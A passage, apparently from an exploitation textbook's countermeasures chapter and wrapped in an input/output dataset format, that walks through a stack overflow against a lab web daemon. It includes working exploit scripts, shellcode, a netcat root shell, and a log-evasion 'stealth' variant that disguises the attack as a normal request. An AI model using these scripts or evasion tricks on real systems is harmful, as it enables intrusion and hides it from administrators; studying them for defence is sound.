daemon..\nreader@hacking:~/booksrc $ ps aux | grep tinywebd\nroot 25830 0.0 0.0 1636 356 ? Ss 20:10 0:00 ./tinywebd\nreader 25837 0.0 0.0 2880 748 pts/1 R+ 20:10 0:00 grep tinywebd\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ sudo gdb -q—pid=25830 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nAttaching to process 25830\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already. Kill it? (y or n) n\nProgram not killed.\n(gdb) bt\n#0 0xb7fe77f2 in ?? ()\n#1 0xb7f691e1 in ?? ()\n#2 0x08048f87 in main () at tinywebd.c:68\n(gdb) list 68\n330 0x600\n63 if (listen(sockfd, 20) == -1)\n64 fatal(\"listening on socket\");\n65\n66 while(1) { // Accept loop\n67 sin_size = sizeof(struct sockaddr_in);\n68 new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n69 if(new_sockfd == -1)\n70 fatal(\"accepting connection\");\n71\n72 handle_connection(new_sockfd, &client_addr, logfd);\n(gdb) list handle_connection\n77 /* This function handles the connection on the passed socket from the\n78 * passed client address and logs to the passed FD. The connection is\n79 * processed as a web request, and this function replies over the connected\n80 * socket. Finally, the passed socket is closed at the end of the function.\n81 */\n82 void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83 unsigned char *ptr, request[500], resource[500], log_buffer[500];\n84 int fd, length;\n85\n86 length = recv_line(sockfd, request);\n(gdb) break 86\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\n(gdb) cont\nContinuing.\nThe execution pauses while the tinyweb daemon waits for a connection.\nOnce again, a connection is made to the webserver using a browser to advance\nthe code execution to the breakpoint.\nBreakpoint 1, handle_connection (sockfd=5, client_addr_ptr=0xbffff810) at tinywebd.c:86\n86 length = recv_line(sockfd, request);\n(gdb) bt\n#0 handle_connection (sockfd=5, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n#1 0x08048fb7 in main () at tinywebd.c:72\n(gdb) x/x request\n0xbffff5c0: 0x080484ec\n(gdb) x/16x request + 500\n0xbffff7b4: 0xb7fd5ff4 0xb8000ce0 0x00000000 0xbffff848\n0xbffff7c4: 0xb7ff9300 0xb7fd5ff4 0xbffff7e0 0xb7f691c0\n0xbffff7d4: 0xb7fd5ff4 0xbffff848 0x08048fb7 0x00000005\n0xbffff7e4: 0xbffff810 0x00000003 0xbffff838 0x00000004\n(gdb) x/x 0xbffff7d4 + 8\n0xbffff7dc: 0x08048fb7\n(gdb) p /x 0xbffff7dc - 0xbffff5c0\n$1 = 0x21c\n(gdb) p 0xbffff7dc - 0xbffff5c0\n$2 = 540\n(gdb) p /x 0xbffff5c0 + 100\n$3 = 0xbffff624\n(gdb) quit\nThe program is running. Quit anyway (and detach it)? (y or n) y\nDetaching from program: , process 25830\nreader@hacking:~/booksrc $\nCountermeasures 331\nThe debugger shows that the request buffer starts at 0xbffff5c0 and the\nstored return address is at 0xbffff7dc, which means the offset is 540 bytes.\nThe safest place for the shellcode is near the middle of the 500-byte request\nbuffer. In the output below, an exploit buffer is created that sandwiches the\nshellcode between a NOP sled and the return address repeated 32 times. The\n128 bytes of repeated return address keep the shellcode out of unsafe stack\nmemory, which might be overwritten. There are also unsafe bytes near the\nbeginning of the exploit buffer, which will be overwritten during null termina-\ntion. To keep the shellcode out of this range, a 100-byte NOP sled is put in\nfront of it. This leaves a safe landing zone for the execution pointer, with the\nshellcode at 0xbffff624. The following output exploits the vulnerability using\nthe loopback shellcode.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ wc -c loopback_shell\n83 loopback_shell\nreader@hacking:~/booksrc $ echo $((540+4 - (32*4) - 83))\n333\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 9835\nreader@hacking:~/booksrc $ jobs\n[1]+ Running nc -l -p 31337 &\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x333'; cat loopback_shell; perl -e 'print \"\\\nx24\\xf6\\xff\\xbf\"x32 . \"\\r\\n\"') | nc -w 1 -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\nSince the offset to the return address is 540 bytes, 544 bytes are needed\nto overwrite the address. With the loopback shellcode at 83 bytes and the\noverwritten return address repeated 32 times, simple arithmetic shows that\nthe NOP sled needs to be 333 bytes to align everything in the exploit buffer\nproperly. netcat is run in listen mode with an ampersand (&) appended to\nthe end, which sends the process to the background. This listens for the con-\nnection back from the shellcode and can be resumed later with the command\nfg (foreground). On the LiveCD, the at (@) symbol in the command prompt\nwill change color if there are background jobs, which can also be listed with\nthe jobs command. When the exploit buffer is piped into netcat, the -w option\nis used to tell it to time out after one second. Afterward, the backgrounded\nnetcat process that received the connectback shell can be resumed.\nAll this works fine, but if a shellcode of different size is used, the NOP\nsled size must be recalculated. All these repetitive steps can be put into a\nsingle shell script.\nThe BASH shell allows for simple control structures. The if statement at\nthe beginning of this script is just for error checking and displaying the usage\n332 0x600\nmessage. Shell variables are used for the offset and overwrite return address,\nso they can be easily changed for a different target. The shellcode used for\nthe exploit is passed as a command-line argument, which makes this a useful\ntool for trying out a variety of shellcodes.\nxtool_tinywebd.sh\n#!/bin/sh\n# A tool for exploiting tinywebd\nif [ -z \"$2\" ]; then # If argument 2 is blank\necho \"Usage: $0 <shellcode file> <target IP>\"\nexit\nfi\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))\necho \"[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr\n($((4*32)) bytes)]\"\n( perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\ncat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\";) | nc -w 1 -v $2 80\nNotice that this script repeats the return address an additional thirty-third\ntime, but it uses 128 bytes (32 × 4) for calculating the sled size. This puts an\nextra copy of the return address past where the offset dictates. Sometimes\ndifferent compiler options will move the return address around a little bit,\nso this makes the exploit more reliable. The output below shows this tool being\nused to exploit the tinyweb daemon once again, but with the port-binding\nshellcode.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh portbinding_shellcode 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: portbinding_shellcode (92 bytes)\n[NOP (324 bytes)] [shellcode (92 bytes)] [ret addr (128 bytes)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\nNow that the attacking side is armed with an exploit script, consider what\nhappens when it’s used. If you were the administrator of the server running\nthe tinyweb daemon, what would be the first signs that you were hacked?\nCountermeasures 333"
  },
  {
    "input": "0x641 Blend In with the Crowd",
    "output": "0x640 Log Files\nOne of the two most obvious signs of intrusion is the log file. The log file kept\nby the tinyweb daemon is one of the first places to look into when trouble-\nshooting a problem. Even though the attacker’s exploits were successful,\nthe log file keeps a painfully obvious record that something is up.\ntinywebd Log File\nreader@hacking:~/booksrc $ sudo cat /var/log/tinywebd.log\n07/25/2007 14:55:45> Starting up.\n07/25/2007 14:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\" 200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\" 200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\" 200 OK\n07/25/2007 17:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\" 404 Not Found\n07/25/2007 17:57:21> Shutting down.\n08/01/2007 15:43:08> Starting up.. (cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)08(cid:0)/(cid:0)01(cid:0)/(cid:0)20(cid:0)0(cid:0)7(cid:0) 1(cid:0)5(cid:0):4(cid:0)3(cid:0):(cid:0)41(cid:0)>(cid:0) (cid:0)Fr(cid:0)o(cid:0)m (cid:0)1(cid:0)2(cid:0)7.(cid:0)0(cid:0).0(cid:0).(cid:0)1(cid:0):4(cid:0)5(cid:0)39(cid:0)6(cid:0) (cid:0)\"(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)\n(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0)(cid:0) (cid:0) (cid:0) (cid:0)(cid:0) (cid:0) (cid:0)(cid:0)\n(cid:0) (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0)(cid:0)(cid:0) (cid:0) (cid:0)(cid:0) jfX 1 CRj j jfXCh\nf T$ fhzifS j QV C I ? Iy (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)\n(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0) (cid:0)(cid:0)(cid:0)Rh/(cid:0)/(cid:0)sh(cid:0)h/(cid:0)b(cid:0)in(cid:0) (cid:0)R(cid:0)(cid:0) S(cid:0)(cid:0)(cid:0) $(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0) (cid:0)\n(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$(cid:0)(cid:0)(cid:0)$ $ $ $ $ $ $ $ $ $\n$ $ $ $ $ $ $ $ \" NOT HTTP!\nreader@hacking:~/booksrc $\nOf course in this case, after the attacker gains a root shell, he can just edit\nthe log file since it’s on the same system. On secure networks, however, copies\nof logs are often sent to another secure server. In extreme cases, logs are sent\nto a printer for hard copy, so there is a physical record. These types of counter-\nmeasures prevent tampering with the logs after successful exploitation.\n0x641 Blend In with the Crowd\nEven though the log files themselves cannot be changed, occasionally what\ngets logged can be. Log files usually contain many valid entries, whereas\nexploit attempts stick out like a sore thumb. The tinyweb daemon program\ncan be tricked into logging a valid-looking entry for an exploit attempt.\nLook at the source code and see if you can figure out how to do this before\ncontinuing on. The idea is to make the log entry look like a valid web request,\nlike the following:\n07/22/2007 17:57:00> From 127.0.0.1:38127 \"HEAD / HTTP/1.0\" 200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50201 \"GET / HTTP/1.1\" 200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50202 \"GET /image.jpg HTTP/1.1\" 200 OK\n07/25/2007 14:49:14> From 127.0.0.1:50203 \"GET /favicon.ico HTTP/1.1\" 404 Not Found\nThis type of camouflage is very effective at large enterprises with extensive\nlog files, since there are so many valid requests to hide among: It’s easier to\nblend in at a crowded mall than an empty street. But how exactly do you hide\na big, ugly exploit buffer in the proverbial sheep’s clothing?\n334 0x600\nThere’s a simple mistake in the tinyweb daemon’s source code that allows\nthe request buffer to be truncated early when it’s used for the log file output,\nbut not when copying into memory. The recv_line() function uses \\r\\n as the\ndelimiter; however, all the other standard string functions use a null byte for\nthe delimiter. These string functions are used to write to the log file, so by\nstrategically using both delimiters, the data written to the log can be partially\ncontrolled.\nThe following exploit script puts a valid-looking request in front of the rest\nof the exploit buffer. The NOP sled is shrunk to accommodate the new data.\nxtool_tinywebd_stealth.sh\n#!/bin/sh\n# stealth exploitation tool\nif [ -z \"$2\" ]; then # If argument 2 is blank\necho \"Usage: $0 <shellcode file> <target IP>\"\nexit\nfi\nFAKEREQUEST=\"GET / HTTP/1.1\\x00\"\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nOFFSET=540\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))\necho \"[Fake Request ($FR_SIZE b)] [NOP ($ALIGNED_SLED_SIZE b)] [shellcode\n($SIZE b)] [ret addr ($((4*32)) b)]\"\n(perl -e \"print \\\"$FAKEREQUEST\\\" . \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\ncat $1;\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\nThis new exploit buffer uses the null byte delimiter to terminate the fake\nrequest camouflage. A null byte won’t stop the recv_line() function, so the\nrest of the exploit buffer is copied to the stack. Since the string functions\nused to write to the log use a null byte for termination, the fake request is\nlogged and the rest of the exploit is hidden. The following output shows this\nexploit script in use.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nc -l -p 31337 &\n[1] 7714\nreader@hacking:~/booksrc $ jobs\n[1]+ Running nc -l -p 31337 &\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: loopback_shell (83 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (318 b)] [shellcode (83 b)] [ret addr (128 b)]\nCountermeasures 335"
  },
  {
    "input": "0x651 One Step at a Time",
    "output": "localhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ fg\nnc -l -p 31337\nwhoami\nroot\nThe connection used by this exploit creates the following log file entries\non the server machine.\n08/02/2007 13:37:36> Starting up..\n08/02/2007 13:37:44> From 127.0.0.1:32828 \"GET / HTTP/1.1\" 200 OK\nEven though the logged IP address cannot be changed using this method,\nthe request itself appears valid, so it won’t attract too much attention.\n0x650 Overlooking the Obvious\nIn a real-world scenario, the other obvious sign of intrusion is even more\napparent than log files. However, when testing, this is something that is easily\noverlooked. If log files seem like the most obvious sign of intrusion to you,\nthen you are forgetting about the loss of service. When the tinyweb daemon\nis exploited, the process is tricked into providing a remote root shell, but it\nno longer processes web requests. In a real-world scenario, this exploit would\nbe detected almost immediately when someone tries to access the website.\nA skilled hacker can not only crack open a program to exploit it, he can\nalso put the program back together again and keep it running. The program\ncontinues to process requests and it seems like nothing happened.\n0x651 One Step at a Time\nComplex exploits are difficult because so many different things can go wrong,\nwith no indication of the root cause. Since it can take hours just to track down\nwhere the error occurred, it’s usually better to break a complex exploit down\ninto smaller parts. The end goal is a piece of shellcode that will spawn a shell\nyet keep the tinyweb server running. The shell is interactive, which causes\nsome complications, so let’s deal with that later. For now, the first step should\nbe figuring out how to put the tinyweb daemon back together after exploit-\ning it. Let’s begin by writing a piece of shellcode that does something to prove\nit ran and then puts the tinyweb daemon back together so it can process fur-\nther web requests.\nSince the tinyweb daemon redirects standard out to /dev/null, writing\nto standard out isn’t a reliable marker for shellcode. One simple way to prove\nthe shellcode ran is to create a file. This can be done by making a call to open(),\nand then close(). Of course, the open() call will need the appropriate flags to\ncreate a file. We could look through the include files to figure out what O_CREAT\nand all the other necessary defines actually are and do all the bitwise math\nfor the arguments, but that’s sort of a pain in the ass. If you recall, we’ve done\nsomething like this already—the notetaker program makes a call to open()\nwhich will create a file if it didn’t exist. The strace program can be used on\n336 0x600\nany program to show every system call it makes. In the output below, this is\nused to verify that the arguments to open() in C match up with the raw sys-\ntem calls.\nreader@hacking:~/booksrc $ strace ./notetaker test\nexecve(\"./notetaker\", [\"./notetaker\", \"test\"], [/* 27 vars */]) = 0\nbrk(0) = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000\naccess(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory)\nopen(\"/etc/ld.so.cache\", O_RDONLY) = 3\nfstat64(3, {st_mode=S_IFREG|0644, st_size=70799, ..}) = 0\nmmap2(NULL, 70799, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd3000\nclose(3) = 0\naccess(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)\nopen(\"/lib/tls/i686/cmov/libc.so.6\", O_RDONLY) = 3\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0`\\1\\000\".., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ..}) = 0\nmmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e92000\nmmap2(0xb7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13b) =\n0xb7fcd000\nmmap2(0xb7fd0000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =\n0xb7fd0000\nclose(3) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e91000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7e916c0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nmprotect(0xb7fcd000, 4096, PROT_READ) = 0\nmunmap(0xb7fd3000, 70799) = 0\nbrk(0) = 0x804a000\nbrk(0x806b000) = 0x806b000\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000\nwrite(1, \"[DEBUG] buffer @ 0x804a008: \\'t\".., 37[DEBUG] buffer @ 0x804a008: 'test'\n) = 37\nwrite(1, \"[DEBUG] datafile @ 0x804a070: \\'/\".., 43[DEBUG] datafile @ 0x804a070: '/var/notes'\n) = 43\nopen(\"/var/notes\", O_WRONLY|O_APPEND|O_CREAT, 0600) = -1 EACCES (Permission denied)\ndup(2) = 3\nfcntl64(3, F_GETFL) = 0x2 (flags O_RDWR)\nfstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe3000\n_llseek(3, 0, 0xbffff4e4, SEEK_CUR) = -1 ESPIPE (Illegal seek)\nwrite(3, \"[!!] Fatal Error in main() while\".., 65[!!] Fatal Error in main() while opening file:\nPermission denied\n) = 65\nclose(3) = 0\nmunmap(0xb7fe3000, 4096) = 0\nexit_group(-1) = ?\nProcess 21473 detached\nreader@hacking:~/booksrc $ grep open notetaker.c\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nfatal(\"in main() while opening file\");\nreader@hacking:~/booksrc $\nCountermeasures 337\nWhen run through strace, the notetaker binary’s suid-bit isn’t used, so it\ndoesn’t have permission to open the data file. That doesn’t matter, though;\nwe just want to make sure the arguments to the open() system call match the\narguments to the open() call in C. Since they match, we can safely use the values\npassed to the open() function in the notetaker binary as the arguments for the\nopen() system call in our shellcode. The compiler has already done all the work\nof looking up the defines and mashing them together with a bitwise OR oper-\nation; we just need to find the call arguments in the disassembly of the note-\ntaker binary.\nreader@hacking:~/booksrc $ gdb -q ./notetaker\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) set dis intel\n(gdb) disass main\nDump of assembler code for function main:\n0x0804875f <main+0>: push ebp\n0x08048760 <main+1>: mov ebp,esp\n0x08048762 <main+3>: sub esp,0x28\n0x08048765 <main+6>: and esp,0xfffffff0\n0x08048768 <main+9>: mov eax,0x0\n0x0804876d <main+14>: sub esp,eax\n0x0804876f <main+16>: mov DWORD PTR [esp],0x64\n0x08048776 <main+23>: call 0x8048601 <ec_malloc>\n0x0804877b <main+28>: mov DWORD PTR [ebp-12],eax\n0x0804877e <main+31>: mov DWORD PTR [esp],0x14\n0x08048785 <main+38>: call 0x8048601 <ec_malloc>\n0x0804878a <main+43>: mov DWORD PTR [ebp-16],eax\n0x0804878d <main+46>: mov DWORD PTR [esp+4],0x8048a9f\n0x08048795 <main+54>: mov eax,DWORD PTR [ebp-16]\n0x08048798 <main+57>: mov DWORD PTR [esp],eax\n0x0804879b <main+60>: call 0x8048480 <strcpy@plt>\n0x080487a0 <main+65>: cmp DWORD PTR [ebp+8],0x1\n0x080487a4 <main+69>: jg 0x80487ba <main+91>\n0x080487a6 <main+71>: mov eax,DWORD PTR [ebp-16]\n0x080487a9 <main+74>: mov DWORD PTR [esp+4],eax\n0x080487ad <main+78>: mov eax,DWORD PTR [ebp+12]\n0x080487b0 <main+81>: mov eax,DWORD PTR [eax]\n0x080487b2 <main+83>: mov DWORD PTR [esp],eax\n0x080487b5 <main+86>: call 0x8048733 <usage>\n0x080487ba <main+91>: mov eax,DWORD PTR [ebp+12]\n0x080487bd <main+94>: add eax,0x4\n0x080487c0 <main+97>: mov eax,DWORD PTR [eax]\n0x080487c2 <main+99>: mov DWORD PTR [esp+4],eax\n0x080487c6 <main+103>: mov eax,DWORD PTR [ebp-12]\n0x080487c9 <main+106>: mov DWORD PTR [esp],eax\n0x080487cc <main+109>: call 0x8048480 <strcpy@plt>\n0x080487d1 <main+114>: mov eax,DWORD PTR [ebp-12]\n0x080487d4 <main+117>: mov DWORD PTR [esp+8],eax\n0x080487d8 <main+121>: mov eax,DWORD PTR [ebp-12]\n0x080487db <main+124>: mov DWORD PTR [esp+4],eax\n0x080487df <main+128>: mov DWORD PTR [esp],0x8048aaa\n0x080487e6 <main+135>: call 0x8048490 <printf@plt>\n0x080487eb <main+140>: mov eax,DWORD PTR [ebp-16]\n338 0x600\n0x080487ee <main+143>: mov DWORD PTR [esp+8],eax\n0x080487f2 <main+147>: mov eax,DWORD PTR [ebp-16]\n0x080487f5 <main+150>: mov DWORD PTR [esp+4],eax\n0x080487f9 <main+154>: mov DWORD PTR [esp],0x8048ac7\n0x08048800 <main+161>: call 0x8048490 <printf@plt>\n0x08048805 <main+166>: mov DWORD PTR [esp+8],0x180\n0x0804880d <main+174>: mov DWORD PTR [esp+4],0x441\n0x08048815 <main+182>: mov eax,DWORD PTR [ebp-16]\n0x08048818 <main+185>: mov DWORD PTR [esp],eax\n0x0804881b <main+188>: call 0x8048410 <open@plt>\n---Type <return> to continue, or q <return> to quit---q\nQuit\n(gdb)\nRemember that the arguments to a function call will be pushed to the\nstack in reverse. In this case, the compiler decided to use mov DWORD PTR\n[esp+offset], value_to_push_to_stack instead of push instructions, but the\nstructure built on the stack is equivalent. The first argument is a pointer to\nthe name of the file in EAX, the second argument (put at [esp+4]) is 0x441,\nand the third argument (put at [esp+8]) is 0x180. This means that O_WRONLY|\nO_CREAT|O_APPEND turns out to be 0x441 and S_IRUSR|S_IWUSR is 0x180. The\nfollowing shellcode uses these values to create a file called Hacked in the\nroot filesystem.\nmark.s\nBITS 32\n; Mark the filesystem to prove you ran.\njmp short one\ntwo:\npop ebx ; Filename\nxor ecx, ecx\nmov BYTE [ebx+7], cl ; Null terminate filename\npush BYTE 0x5 ; Open()\npop eax\nmov WORD cx, 0x441 ; O_WRONLY|O_APPEND|O_CREAT\nxor edx, edx\nmov WORD dx, 0x180 ; S_IRUSR|S_IWUSR\nint 0x80 ; Open file to create it.\n; eax = returned file descriptor\nmov ebx, eax ; File descriptor to second arg\npush BYTE 0x6 ; Close ()\npop eax\nint 0x80 ; Close file.\nxor eax, eax\nmov ebx, eax\ninc eax ; Exit call.\nint 0x80 ; Exit(0), to avoid an infinite loop.\none:\ncall two\ndb \"/HackedX\"\n; 01234567\nCountermeasures 339"
  },
  {
    "input": "0x652 Putting Things Back Together Again",
    "output": "The shellcode opens a file to create it and then immediately closes the\nfile. Finally, it calls exit to avoid an infinite loop. The output below shows this\nnew shellcode being used with the exploit tool.\nreader@hacking:~/booksrc $ ./tinywebd\nStarting tiny web daemon.\nreader@hacking:~/booksrc $ nasm mark.s\nreader@hacking:~/booksrc $ hexdump -C mark\n00000000 eb 23 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.#[1.K.j.Xf.A.1|\n00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 31 c0 |.f....j.X.1.|\n00000020 89 c3 40 cd 80 e8 d8 ff ff ff 2f 48 61 63 6b 65 |.@..../Hacke|\n00000030 64 58 |dX|\n00000032\nreader@hacking:~/booksrc $ ls -l /Hacked\nls: /Hacked: No such file or directory\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark 127.0.0.1\ntarget IP: 127.0.0.1\nshellcode: mark (44 bytes)\nfake request: \"GET / HTTP/1.1\\x00\" (15 bytes)\n[Fake Request (15 b)] [NOP (357 b)] [shellcode (44 b)] [ret addr (128 b)]\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ ls -l /Hacked\n-rw------- 1 root reader 0 2007-09-17 16:59 /Hacked\nreader@hacking:~/booksrc $\n0x652 Putting Things Back Together Again\nTo put things back together again, we just need to repair any collateral damage\ncaused by the overwrite and/or shellcode, and then jump execution back\ninto the connection accepting loop in main(). The disassembly of main() in\nthe output below shows that we can safely return to the addresses 0x08048f64,\n0x08048f65, or 0x08048fb7 to get back into the connection accept loop.\nreader@hacking:~/booksrc $ gcc -g tinywebd.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048d93 <main+0>: push ebp\n0x08048d94 <main+1>: mov ebp,esp\n0x08048d96 <main+3>: sub esp,0x68\n0x08048d99 <main+6>: and esp,0xfffffff0\n0x08048d9c <main+9>: mov eax,0x0\n0x08048da1 <main+14>: sub esp,eax\n.:[ output trimmed ]:.\n0x08048f4b <main+440>: mov DWORD PTR [esp],eax\n0x08048f4e <main+443>: call 0x8048860 <listen@plt>\n0x08048f53 <main+448>: cmp eax,0xffffffff\n0x08048f56 <main+451>: jne 0x8048f64 <main+465>\n0x08048f58 <main+453>: mov DWORD PTR [esp],0x804961a\n340 0x600\n0x08048f5f <main+460>: call 0x8048ac4 <fatal>\n0x08048f64 <main+465>: nop\n0x08048f65 <main+466>: mov DWORD PTR [ebp-60],0x10\n0x08048f6c <main+473>: lea eax,[ebp-60]\n0x08048f6f <main+476>: mov DWORD PTR [esp+8],eax\n0x08048f73 <main+480>: lea eax,[ebp-56]\n0x08048f76 <main+483>: mov DWORD PTR 